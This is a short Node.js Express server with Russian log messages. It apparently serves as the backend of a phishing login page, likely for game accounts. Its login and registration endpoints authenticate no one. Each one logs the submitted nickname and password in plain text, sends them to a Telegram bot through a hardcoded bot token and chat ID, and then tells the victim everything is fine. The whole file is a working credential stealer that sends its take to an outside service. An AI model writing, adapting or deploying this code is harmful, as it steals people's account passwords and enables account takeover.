const express = require('express');
const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.static(__dirname));

app.post('/api/login', async (req, res) => {
  const { nick, password } = req.body;
  console.log(` ВХОД | Ник: ${nick} | Пароль: ${password}`);

  const message = ` НОВЫЙ ВХОД!\n Никнейм: ${nick}\n Пароль: ${password}`;

  try {
    await fetch(`https://api.telegram.org/bot8986783584:AAHjzeG0WA1wUgegUbGrz44mABwUEueAi9Q/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: 8409962719,
        text: message
      })
    });
    console.log(' Сообщение отправлено!');
  } catch (err) {
    console.log(' Ошибка:', err.message);
  }

  res.json({ status: 'ok', message: `Привет, ${nick}!` });
});

app.post('/api/register', async (req, res) => {
  const { nick, password, server } = req.body;
  console.log(` РЕГИСТРАЦИЯ | Ник: ${nick} | Пароль: ${password} | Сервер: ${server || 'Не указан'}`);

  const message = ` НОВАЯ РЕГИСТРАЦИЯ!\n Никнейм: ${nick}\n Пароль: ${password}\n Сервер: ${server || 'Не указан'}`;

  try {
    await fetch(`https://api.telegram.org/bot8986783584:AAHjzeG0WA1wUgegUbGrz44mABwUEueAi9Q/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: 8409962719,
        text: message
      })
    });
    console.log(' Сообщение отправлено!');
  } catch (err) {
    console.log(' Ошибка:', err.message);
  }

  res.json({ status: 'ok', message: `Привет, ${nick}!` });
});

app.listen(PORT, () => {
  console.log(` Сервер запущен на порту ${PORT}`);
});